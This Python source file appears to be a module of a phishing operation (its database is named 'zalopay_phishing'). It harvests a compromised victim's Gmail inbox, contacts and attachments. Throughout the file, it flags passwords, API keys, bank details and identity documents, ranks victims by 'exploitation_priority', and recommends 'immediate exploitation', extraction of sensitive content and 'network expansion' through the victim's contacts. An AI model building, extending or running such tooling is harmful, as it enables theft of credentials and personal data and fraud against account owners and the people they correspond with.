"""
Gmail Intelligence Engine
Advanced Gmail intelligence with email analysis, contact mapping, and content classification
"""

import os
import json
import time
import asyncio
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple, Set
import logging
import re
from collections import defaultdict, Counter
from enum import Enum

from engines.gmail.gmail_client import GmailAPIClient
from engines.gmail.email_extractor import EmailExtractor
from engines.gmail.contact_extractor import ContactExtractor
from engines.gmail.intelligence_analyzer import IntelligenceAnalyzer
from engines.gmail.export_manager import ExportManager
from security.encryption_manager import get_advanced_encryption_manager

logger = logging.getLogger(__name__)

class IntelligenceCategory(Enum):
    """Intelligence category enumeration"""
    FINANCIAL = "financial"
    PERSONAL = "personal"
    BUSINESS = "business"
    TECHNICAL = "technical"
    SOCIAL = "social"
    STRATEGIC = "strategic"

class ContentType(Enum):
    """Content type enumeration"""
    EMAIL = "email"
    ATTACHMENT = "attachment"
    CONTACT = "contact"
    CALENDAR = "calendar"
    DRIVE = "drive"
    UNKNOWN = "unknown"

class GmailIntelligenceEngine:
    """Advanced Gmail intelligence engine"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        
        # Initialize components
        self.gmail_client = GmailAPIClient(mongodb_connection, redis_client)
        self.email_extractor = EmailExtractor()
        self.contact_extractor = ContactExtractor()
        self.intelligence_analyzer = IntelligenceAnalyzer(mongodb_connection, redis_client)
        self.export_manager = ExportManager()
        self.encryption_manager = get_advanced_encryption_manager()
        
        # Configuration
        self.config = {
            "max_emails_per_analysis": int(os.getenv("MAX_EMAILS_PER_ANALYSIS", "1000")),
            "enable_content_classification": os.getenv("ENABLE_CONTENT_CLASSIFICATION", "true").lower() == "true",
            "enable_contact_mapping": os.getenv("ENABLE_CONTACT_MAPPING", "true").lower() == "true",
            "enable_behavioral_analysis": os.getenv("ENABLE_BEHAVIORAL_ANALYSIS", "true").lower() == "true",
            "enable_attachment_analysis": os.getenv("ENABLE_ATTACHMENT_ANALYSIS", "true").lower() == "true",
            "analysis_timeout": int(os.getenv("GMAIL_ANALYSIS_TIMEOUT", "300")),
            "cache_results": os.getenv("CACHE_GMAIL_RESULTS", "true").lower() == "true",
            "cache_duration": int(os.getenv("GMAIL_CACHE_DURATION", "3600"))
        }
        
        # Intelligence patterns
        self.intelligence_patterns = self._load_intelligence_patterns()
        self.content_classifiers = self._load_content_classifiers()
        
        # Analysis cache
        self.analysis_cache = {}
        
        logger.info("Gmail intelligence engine initialized")
    
    async def analyze_victim_gmail(self, victim_id: str, analysis_options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Comprehensive Gmail analysis for victim
        
        Args:
            victim_id: Victim identifier
            analysis_options: Analysis configuration options
            
        Returns:
            Comprehensive intelligence analysis
        """
        try:
            # Check cache first
            if self.config["cache_results"]:
                cached_result = self._get_cached_analysis(victim_id)
                if cached_result:
                    return cached_result
            
            # Initialize analysis result
            analysis_result = {
                "victim_id": victim_id,
                "analysis_id": f"gmail_analysis_{int(time.time())}",
                "started_at": datetime.now(timezone.utc).isoformat(),
                "status": "in_progress",
                "intelligence_summary": {},
                "email_analysis": {},
                "contact_network": {},
                "content_classification": {},
                "behavioral_profile": {},
                "attachments_analysis": {},
                "recommendations": [],
                "errors": []
            }
            
            # Set analysis options
            options = analysis_options or {}
            max_emails = options.get("max_emails", self.config["max_emails_per_analysis"])
            include_attachments = options.get("include_attachments", self.config["enable_attachment_analysis"])
            
            # Step 1: Get user profile
            profile_result = self.gmail_client.get_user_profile(victim_id)
            if profile_result["success"]:
                analysis_result["user_profile"] = profile_result["profile"]
            else:
                analysis_result["errors"].append(f"Failed to get user profile: {profile_result.get('error')}")
            
            # Step 2: Extract emails
            emails_result = await self._extract_emails(victim_id, max_emails)
            analysis_result["email_analysis"] = emails_result
            
            # Step 3: Analyze contacts
            if self.config["enable_contact_mapping"]:
                contacts_result = await self._analyze_contacts(victim_id, emails_result.get("messages", []))
                analysis_result["contact_network"] = contacts_result
            
            # Step 4: Classify content
            if self.config["enable_content_classification"]:
                classification_result = await self._classify_content(emails_result.get("messages", []))
                analysis_result["content_classification"] = classification_result
            
            # Step 5: Analyze attachments
            if include_attachments:
                attachments_result = await self._analyze_attachments(victim_id, emails_result.get("messages", []))
                analysis_result["attachments_analysis"] = attachments_result
            
            # Step 6: Behavioral analysis
            if self.config["enable_behavioral_analysis"]:
                behavioral_result = await self._analyze_behavioral_patterns(emails_result.get("messages", []))
                analysis_result["behavioral_profile"] = behavioral_result
            
            # Step 7: Generate intelligence summary
            intelligence_summary = await self._generate_intelligence_summary(analysis_result)
            analysis_result["intelligence_summary"] = intelligence_summary
            
            # Step 8: Generate recommendations
            recommendations = self._generate_recommendations(analysis_result)
            analysis_result["recommendations"] = recommendations
            
            # Complete analysis
            analysis_result["status"] = "completed"
            analysis_result["completed_at"] = datetime.now(timezone.utc).isoformat()
            
            # Cache result
            if self.config["cache_results"]:
                self._cache_analysis_result(victim_id, analysis_result)
            
            # Store in database
            await self._store_analysis_result(analysis_result)
            
            logger.info(f"Gmail intelligence analysis completed for victim: {victim_id}")
            return analysis_result
            
        except Exception as e:
            logger.error(f"Error analyzing victim Gmail: {e}")
            return {
                "victim_id": victim_id,
                "status": "failed",
                "error": str(e),
                "completed_at": datetime.now(timezone.utc).isoformat()
            }
    
    async def _extract_emails(self, victim_id: str, max_emails: int) -> Dict[str, Any]:
        """Extract and analyze emails"""
        try:
            # Get recent emails
            messages_result = self.gmail_client.list_messages(
                victim_id=victim_id,
                query="in:inbox",
                max_results=max_emails
            )
            
            if not messages_result["success"]:
                return {"error": messages_result.get("error"), "messages": []}
            
            messages = messages_result["messages"]
            
            # Extract intelligence from emails
            extracted_intelligence = []
            for message in messages:
                try:
                    intelligence = self.email_extractor.extract_intelligence(message)
                    if intelligence:
                        extracted_intelligence.append(intelligence)
                except Exception as e:
                    logger.error(f"Error extracting intelligence from message: {e}")
                    continue
            
            return {
                "total_messages": len(messages),
                "messages": messages,
                "extracted_intelligence": extracted_intelligence,
                "intelligence_count": len(extracted_intelligence)
            }
            
        except Exception as e:
            logger.error(f"Error extracting emails: {e}")
            return {"error": str(e), "messages": []}
    
    async def _analyze_contacts(self, victim_id: str, messages: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze contact network"""
        try:
            # Extract contacts from messages
            contacts = []
            for message in messages:
                try:
                    message_contacts = self.contact_extractor.extract_contacts(message)
                    contacts.extend(message_contacts)
                except Exception as e:
                    logger.error(f"Error extracting contacts from message: {e}")
                    continue
            
            # Analyze contact network
            contact_analysis = self._analyze_contact_network(contacts)
            
            return {
                "total_contacts": len(contacts),
                "contacts": contacts,
                "network_analysis": contact_analysis
            }
            
        except Exception as e:
            logger.error(f"Error analyzing contacts: {e}")
            return {"error": str(e), "contacts": []}
    
    def _analyze_contact_network(self, contacts: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze contact network patterns"""
        try:
            # Count contact frequencies
            contact_frequencies = Counter()
            domain_frequencies = Counter()
            
            for contact in contacts:
                email = contact.get("email", "")
                if email:
                    contact_frequencies[email] += 1
                    domain = email.split("@")[1] if "@" in email else "unknown"
                    domain_frequencies[domain] += 1
            
            # Identify key contacts
            key_contacts = [
                {"email": email, "frequency": count}
                for email, count in contact_frequencies.most_common(10)
            ]
            
            # Identify key domains
            key_domains = [
                {"domain": domain, "frequency": count}
                for domain, count in domain_frequencies.most_common(5)
            ]
            
            return {
                "key_contacts": key_contacts,
                "key_domains": key_domains,
                "total_unique_contacts": len(contact_frequencies),
                "total_unique_domains": len(domain_frequencies)
            }
            
        except Exception as e:
            logger.error(f"Error analyzing contact network: {e}")
            return {}
    
    async def _classify_content(self, messages: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Classify email content"""
        try:
            classification_results = {
                "categories": defaultdict(int),
                "content_types": defaultdict(int),
                "sensitive_content": [],
                "business_content": [],
                "personal_content": []
            }
            
            for message in messages:
                try:
                    # Classify message content
                    classification = self._classify_message_content(message)
                    
                    # Update counters
                    for category in classification.get("categories", []):
                        classification_results["categories"][category] += 1
                    
                    for content_type in classification.get("content_types", []):
                        classification_results["content_types"][content_type] += 1
                    
                    # Categorize sensitive content
                    if classification.get("sensitivity_score", 0) > 0.7:
                        classification_results["sensitive_content"].append({
                            "message_id": message.get("id"),
                            "sensitivity_score": classification.get("sensitivity_score"),
                            "categories": classification.get("categories", [])
                        })
                    
                    # Categorize business content
                    if "business" in classification.get("categories", []):
                        classification_results["business_content"].append({
                            "message_id": message.get("id"),
                            "business_score": classification.get("business_score", 0),
                            "topics": classification.get("topics", [])
                        })
                    
                    # Categorize personal content
                    if "personal" in classification.get("categories", []):
                        classification_results["personal_content"].append({
                            "message_id": message.get("id"),
                            "personal_score": classification.get("personal_score", 0),
                            "topics": classification.get("topics", [])
                        })
                        
                except Exception as e:
                    logger.error(f"Error classifying message content: {e}")
                    continue
            
            return {
                "total_classified": len(messages),
                "category_distribution": dict(classification_results["categories"]),
                "content_type_distribution": dict(classification_results["content_types"]),
                "sensitive_content_count": len(classification_results["sensitive_content"]),
                "business_content_count": len(classification_results["business_content"]),
                "personal_content_count": len(classification_results["personal_content"]),
                "sensitive_content": classification_results["sensitive_content"][:10],  # Limit to top 10
                "business_content": classification_results["business_content"][:10],
                "personal_content": classification_results["personal_content"][:10]
            }
            
        except Exception as e:
            logger.error(f"Error classifying content: {e}")
            return {"error": str(e)}
    
    def _classify_message_content(self, message: Dict[str, Any]) -> Dict[str, Any]:
        """Classify individual message content"""
        try:
            # Extract text content
            text_content = self._extract_message_text(message)
            text_lower = text_content.lower()
            
            # Initialize classification
            classification = {
                "categories": [],
                "content_types": ["email"],
                "sensitivity_score": 0.0,
                "business_score": 0.0,
                "personal_score": 0.0,
                "topics": []
            }
            
            # Check for intelligence categories
            for category, patterns in self.intelligence_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, text_lower):
                        classification["categories"].append(category.value)
                        
                        # Calculate category-specific scores
                        if category == IntelligenceCategory.FINANCIAL:
                            classification["sensitivity_score"] += 0.3
                        elif category == IntelligenceCategory.PERSONAL:
                            classification["personal_score"] += 0.2
                        elif category == IntelligenceCategory.BUSINESS:
                            classification["business_score"] += 0.2
                        elif category == IntelligenceCategory.TECHNICAL:
                            classification["sensitivity_score"] += 0.2
                        elif category == IntelligenceCategory.STRATEGIC:
                            classification["sensitivity_score"] += 0.4
                            classification["business_score"] += 0.3
            
            # Normalize scores
            classification["sensitivity_score"] = min(1.0, classification["sensitivity_score"])
            classification["business_score"] = min(1.0, classification["business_score"])
            classification["personal_score"] = min(1.0, classification["personal_score"])
            
            # Extract topics
            classification["topics"] = self._extract_topics(text_content)
            
            return classification
            
        except Exception as e:
            logger.error(f"Error classifying message content: {e}")
            return {"categories": [], "content_types": ["email"], "sensitivity_score": 0.0}
    
    def _extract_message_text(self, message: Dict[str, Any]) -> str:
        """Extract text content from message"""
        try:
            text_parts = []
            
            # Extract from body
            body = message.get("body", {})
            if "text" in body:
                text_parts.append(body["text"])
            if "html" in body:
                html_text = re.sub(r'<[^>]+>', ' ', body["html"])
                text_parts.append(html_text)
            
            # Extract from snippet
            if "snippet" in message:
                text_parts.append(message["snippet"])
            
            # Extract from subject
            headers = message.get("headers", {})
            if "subject" in headers:
                text_parts.append(headers["subject"])
            
            return " ".join(text_parts)
            
        except Exception:
            return ""
    
    def _extract_topics(self, text: str) -> List[str]:
        """Extract topics from text"""
        try:
            # Simple topic extraction based on keywords
            topic_keywords = {
                "finance": ["money", "payment", "bank", "account", "transaction"],
                "work": ["meeting", "project", "deadline", "work", "office"],
                "personal": ["family", "friend", "home", "personal", "private"],
                "travel": ["flight", "hotel", "travel", "trip", "vacation"],
                "health": ["doctor", "medical", "health", "hospital", "medicine"]
            }
            
            text_lower = text.lower()
            topics = []
            
            for topic, keywords in topic_keywords.items():
                if any(keyword in text_lower for keyword in keywords):
                    topics.append(topic)
            
            return topics
            
        except Exception:
            return []
    
    async def _analyze_attachments(self, victim_id: str, messages: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze email attachments"""
        try:
            attachment_analysis = {
                "total_attachments": 0,
                "attachment_types": Counter(),
                "sensitive_attachments": [],
                "large_attachments": [],
                "executable_attachments": []
            }
            
            for message in messages:
                try:
                    attachments_result = self.gmail_client.get_message_attachments(victim_id, message.get("id", ""))
                    
                    if attachments_result["success"]:
                        attachments = attachments_result["attachments"]
                        attachment_analysis["total_attachments"] += len(attachments)
                        
                        for attachment in attachments:
                            # Analyze attachment type
                            filename = attachment.get("filename", "")
                            if filename:
                                file_extension = filename.split(".")[-1].lower()
                                attachment_analysis["attachment_types"][file_extension] += 1
                                
                                # Check for sensitive attachments
                                sensitive_extensions = ["pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx"]
                                if file_extension in sensitive_extensions:
                                    attachment_analysis["sensitive_attachments"].append({
                                        "filename": filename,
                                        "message_id": message.get("id"),
                                        "type": file_extension
                                    })
                                
                                # Check for executable attachments
                                executable_extensions = ["exe", "bat", "cmd", "scr", "com"]
                                if file_extension in executable_extensions:
                                    attachment_analysis["executable_attachments"].append({
                                        "filename": filename,
                                        "message_id": message.get("id"),
                                        "type": file_extension
                                    })
                                
                                # Check for large attachments
                                size = attachment.get("size", 0)
                                if size > 10 * 1024 * 1024:  # 10MB
                                    attachment_analysis["large_attachments"].append({
                                        "filename": filename,
                                        "size": size,
                                        "message_id": message.get("id")
                                    })
                                    
                except Exception as e:
                    logger.error(f"Error analyzing attachments for message: {e}")
                    continue
            
            return {
                "total_attachments": attachment_analysis["total_attachments"],
                "attachment_type_distribution": dict(attachment_analysis["attachment_types"]),
                "sensitive_attachments_count": len(attachment_analysis["sensitive_attachments"]),
                "executable_attachments_count": len(attachment_analysis["executable_attachments"]),
                "large_attachments_count": len(attachment_analysis["large_attachments"]),
                "sensitive_attachments": attachment_analysis["sensitive_attachments"][:10],
                "executable_attachments": attachment_analysis["executable_attachments"],
                "large_attachments": attachment_analysis["large_attachments"][:10]
            }
            
        except Exception as e:
            logger.error(f"Error analyzing attachments: {e}")
            return {"error": str(e)}
    
    async def _analyze_behavioral_patterns(self, messages: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze behavioral patterns"""
        try:
            # Use existing behavioral analyzer
            behavioral_analysis = self.intelligence_analyzer.behavioral_analyzer.analyze_behavioral_patterns(messages)
            
            return behavioral_analysis
            
        except Exception as e:
            logger.error(f"Error analyzing behavioral patterns: {e}")
            return {"error": str(e)}
    
    async def _generate_intelligence_summary(self, analysis_result: Dict[str, Any]) -> Dict[str, Any]:
        """Generate intelligence summary"""
        try:
            summary = {
                "total_intelligence_items": 0,
                "high_value_intelligence": 0,
                "sensitivity_score": 0.0,
                "business_value": 0.0,
                "personal_value": 0.0,
                "technical_value": 0.0,
                "risk_assessment": "low",
                "exploitation_priority": "low"
            }
            
            # Count intelligence items
            email_analysis = analysis_result.get("email_analysis", {})
            extracted_intelligence = email_analysis.get("extracted_intelligence", [])
            summary["total_intelligence_items"] = len(extracted_intelligence)
            
            # Analyze content classification
            content_classification = analysis_result.get("content_classification", {})
            sensitive_count = content_classification.get("sensitive_content_count", 0)
            business_count = content_classification.get("business_content_count", 0)
            personal_count = content_classification.get("personal_content_count", 0)
            
            # Calculate scores
            summary["sensitivity_score"] = min(1.0, sensitive_count / 10.0)
            summary["business_value"] = min(1.0, business_count / 20.0)
            summary["personal_value"] = min(1.0, personal_count / 15.0)
            
            # Count high-value intelligence
            for intelligence in extracted_intelligence:
                confidence = intelligence.get("confidence", 0.0)
                if confidence >= 0.8:
                    summary["high_value_intelligence"] += 1
            
            # Calculate technical value
            attachments_analysis = analysis_result.get("attachments_analysis", {})
            sensitive_attachments = attachments_analysis.get("sensitive_attachments_count", 0)
            summary["technical_value"] = min(1.0, sensitive_attachments / 5.0)
            
            # Determine risk assessment
            total_score = (summary["sensitivity_score"] + summary["business_value"] + 
                          summary["personal_value"] + summary["technical_value"]) / 4.0
            
            if total_score >= 0.8:
                summary["risk_assessment"] = "critical"
                summary["exploitation_priority"] = "critical"
            elif total_score >= 0.6:
                summary["risk_assessment"] = "high"
                summary["exploitation_priority"] = "high"
            elif total_score >= 0.4:
                summary["risk_assessment"] = "medium"
                summary["exploitation_priority"] = "medium"
            else:
                summary["risk_assessment"] = "low"
                summary["exploitation_priority"] = "low"
            
            return summary
            
        except Exception as e:
            logger.error(f"Error generating intelligence summary: {e}")
            return {"error": str(e)}
    
    def _generate_recommendations(self, analysis_result: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate recommendations based on analysis"""
        try:
            recommendations = []
            
            # Intelligence summary recommendations
            intelligence_summary = analysis_result.get("intelligence_summary", {})
            risk_assessment = intelligence_summary.get("risk_assessment", "low")
            exploitation_priority = intelligence_summary.get("exploitation_priority", "low")
            
            if risk_assessment in ["critical", "high"]:
                recommendations.append({
                    "type": "immediate_action",
                    "priority": "critical",
                    "description": f"High-risk victim detected ({risk_assessment}) - immediate exploitation recommended",
                    "action": "prioritize_for_exploitation"
                })
            
            # Content classification recommendations
            content_classification = analysis_result.get("content_classification", {})
            sensitive_count = content_classification.get("sensitive_content_count", 0)
            
            if sensitive_count > 0:
                recommendations.append({
                    "type": "sensitive_content",
                    "priority": "high",
                    "description": f"Found {sensitive_count} sensitive content items - prioritize extraction",
                    "action": "extract_sensitive_content"
                })
            
            # Attachment recommendations
            attachments_analysis = analysis_result.get("attachments_analysis", {})
            executable_count = attachments_analysis.get("executable_attachments_count", 0)
            
            if executable_count > 0:
                recommendations.append({
                    "type": "security_risk",
                    "priority": "critical",
                    "description": f"Found {executable_count} executable attachments - potential security risk",
                    "action": "analyze_executable_attachments"
                })
            
            # Contact network recommendations
            contact_network = analysis_result.get("contact_network", {})
            total_contacts = contact_network.get("total_contacts", 0)
            
            if total_contacts > 50:
                recommendations.append({
                    "type": "network_expansion",
                    "priority": "medium",
                    "description": f"Large contact network ({total_contacts} contacts) - potential for network expansion",
                    "action": "analyze_contact_network"
                })
            
            return recommendations
            
        except Exception as e:
            logger.error(f"Error generating recommendations: {e}")
            return []
    
    def _load_intelligence_patterns(self) -> Dict[IntelligenceCategory, List[str]]:
        """Load intelligence detection patterns"""
        return {
            IntelligenceCategory.FINANCIAL: [
                r'\$\d+', r'bank account', r'credit card', r'payment', r'transaction',
                r'routing number', r'account number', r'balance', r'invoice'
            ],
            IntelligenceCategory.PERSONAL: [
                r'social security', r'passport', r'driver\'s license', r'personal',
                r'private', r'confidential', r'family', r'home address'
            ],
            IntelligenceCategory.BUSINESS: [
                r'company', r'business', r'corporate', r'meeting', r'project',
                r'strategy', r'revenue', r'profit', r'client', r'customer'
            ],
            IntelligenceCategory.TECHNICAL: [
                r'password', r'api key', r'token', r'credential', r'login',
                r'server', r'database', r'admin', r'root', r'access'
            ],
            IntelligenceCategory.STRATEGIC: [
                r'confidential', r'secret', r'classified', r'internal', r'proprietary',
                r'strategy', r'plan', r'roadmap', r'competitive', r'advantage'
            ]
        }
    
    def _load_content_classifiers(self) -> Dict[str, List[str]]:
        """Load content classification patterns"""
        return {
            "sensitive": ["confidential", "secret", "private", "classified", "internal"],
            "business": ["meeting", "project", "client", "customer", "revenue", "profit"],
            "personal": ["family", "friend", "home", "personal", "private"],
            "financial": ["payment", "transaction", "account", "bank", "credit"],
            "technical": ["password", "login", "server", "database", "api"]
        }
    
    def _get_cached_analysis(self, victim_id: str) -> Optional[Dict[str, Any]]:
        """Get cached analysis result"""
        try:
            if victim_id in self.analysis_cache:
                cached_result, cached_at = self.analysis_cache[victim_id]
                
                # Check if cache is still valid
                cache_age = (datetime.now(timezone.utc) - cached_at).total_seconds()
                if cache_age < self.config["cache_duration"]:
                    return cached_result
                
                # Remove expired cache entry
                del self.analysis_cache[victim_id]
            
            return None
            
        except Exception as e:
            logger.error(f"Error getting cached analysis: {e}")
            return None
    
    def _cache_analysis_result(self, victim_id: str, result: Dict[str, Any]):
        """Cache analysis result"""
        try:
            self.analysis_cache[victim_id] = (result, datetime.now(timezone.utc))
            
            # Limit cache size
            if len(self.analysis_cache) > 100:
                # Remove oldest entries
                oldest_keys = sorted(self.analysis_cache.keys(),
                                   key=lambda k: self.analysis_cache[k][1])[:20]
                for key in oldest_keys:
                    del self.analysis_cache[key]
                    
        except Exception as e:
            logger.error(f"Error caching analysis result: {e}")
    
    async def _store_analysis_result(self, analysis_result: Dict[str, Any]):
        """Store analysis result in database"""
        try:
            if not self.mongodb:
                return
            
            db = self.mongodb.get_database("zalopay_phishing")
            analyses_collection = db.gmail_intelligence_analyses
            
            # Encrypt sensitive data
            encrypted_data = self.encryption_manager.encrypt_data(
                analysis_result,
                data_type="gmail_intelligence",
                associated_data=analysis_result["victim_id"]
            )
            
            document = {
                "victim_id": analysis_result["victim_id"],
                "analysis_id": analysis_result["analysis_id"],
                "encrypted_analysis_data": encrypted_data,
                "status": analysis_result["status"],
                "started_at": analysis_result["started_at"],
                "completed_at": analysis_result.get("completed_at"),
                "intelligence_summary": analysis_result.get("intelligence_summary", {}),
                "expires_at": datetime.now(timezone.utc) + timedelta(days=30)
            }
            
            analyses_collection.replace_one(
                {"victim_id": analysis_result["victim_id"]},
                document,
                upsert=True
            )
            
        except Exception as e:
            logger.error(f"Error storing analysis result: {e}")
    
    async def export_intelligence(self, victim_id: str, export_format: str = "json") -> Dict[str, Any]:
        """Export intelligence data"""
        try:
            # Get analysis result
            analysis_result = self._get_cached_analysis(victim_id)
            if not analysis_result:
                return {"error": "No analysis data found"}
            
            # Export using export manager
            export_result = self.export_manager.export_intelligence(
                analysis_result,
                export_format=export_format,
                victim_id=victim_id
            )
            
            return export_result
            
        except Exception as e:
            logger.error(f"Error exporting intelligence: {e}")
            return {"error": str(e)}
    
    def get_analysis_stats(self) -> Dict[str, Any]:
        """Get analysis statistics"""
        try:
            return {
                "cache_size": len(self.analysis_cache),
                "configuration": self.config,
                "intelligence_patterns_count": sum(len(patterns) for patterns in self.intelligence_patterns.values()),
                "content_classifiers_count": sum(len(classifiers) for classifiers in self.content_classifiers.values()),
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            
        except Exception as e:
            logger.error(f"Error getting analysis stats: {e}")
            return {"error": str(e)}

# Global Gmail intelligence engine instance
gmail_intelligence_engine = None

def initialize_gmail_intelligence_engine(mongodb_connection=None, redis_client=None) -> GmailIntelligenceEngine:
    """Initialize global Gmail intelligence engine"""
    global gmail_intelligence_engine
    gmail_intelligence_engine = GmailIntelligenceEngine(mongodb_connection, redis_client)
    return gmail_intelligence_engine

def get_gmail_intelligence_engine() -> GmailIntelligenceEngine:
    """Get global Gmail intelligence engine"""
    if gmail_intelligence_engine is None:
        raise ValueError("Gmail intelligence engine not initialized")
    return gmail_intelligence_engine

# Convenience functions
def analyze_victim_gmail(victim_id: str, analysis_options: Dict[str, Any] = None) -> Dict[str, Any]:
    """Analyze victim Gmail (global convenience function)"""
    return get_gmail_intelligence_engine().analyze_victim_gmail(victim_id, analysis_options)

def export_intelligence(victim_id: str, export_format: str = "json") -> Dict[str, Any]:
    """Export intelligence (global convenience function)"""
    return get_gmail_intelligence_engine().export_intelligence(victim_id, export_format)
